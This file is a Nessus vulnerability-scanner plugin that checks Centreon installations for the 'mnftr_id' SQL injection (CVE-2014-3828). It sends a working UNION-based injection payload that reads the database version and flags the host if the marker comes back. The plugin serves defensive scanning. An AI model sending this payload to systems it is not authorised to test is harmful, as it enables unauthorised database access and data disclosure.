#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(80226);
  script_version("1.10");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2014-3828");
  script_bugtraq_id(70648);
  script_xref(name:"CERT", value:"298796");

  script_name(english:"Centreon GetXMLTrapsForVendor.php 'mnftr_id' Parameter SQLi");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Centreon application installed on the remove host is affected by a
SQL injection vulnerability because the application fails to properly
sanitize user-supplied input to the 'mnftr_id' parameter of the
'GetXMLTrapsForVendor.php' script. A remote, unauthenticated attacker
can exploit this issue to execute arbitrary SQL statements against the
back-end database, leading to the execution of arbitrary code,
manipulation of data, or the disclosure of arbitrary data.

Note that the application is also reportedly affected by additional
SQL injection vulnerabilities as well as a remote command injection
vulnerability, however Nessus has not tested for these issues.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2014/Oct/78");
  script_set_attribute(attribute:"see_also", value:"https://github.com/centreon/");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Centreon 2.5.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2014-3828");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Centreon SQL and Command Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/10/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/10/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/12/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:centreon:centreon");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:merethis:centreon");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("centreon_detect.nbin");
  script_require_keys("www/PHP", "installed_sw/Centreon");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Centreon";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

data = SCRIPT_NAME - ".nasl" + " " + "MySQL Version : ";

postdata = 'mnftr_id=1 or 1=1 union all select concat(0x' + hexstr(data) +
  ', version()),2 -- /**';

res = http_send_recv3(
  method : "POST",
  port   : port,
  item   : dir + "/include/configuration/configObject/traps/GetXMLTrapsForVendor.php",
  data   : postdata,
  add_headers  : make_array("Content-Type","application/x-www-form-urlencoded"),
  exit_on_fail : TRUE
);

pat = data + '[^\\]]+';
if (ereg(pattern:pat, string:res[2], multiline:TRUE))
{
  output =  extract_pattern_from_resp(
    string  : res[2],
    pattern : 'RE:'+pat
  );

  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    sqli       : TRUE,  # Sets SQLInjection KB key
    line_limit : 3,
    request    : make_list(http_last_sent_request()),
    output     : chomp(output)
  );
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
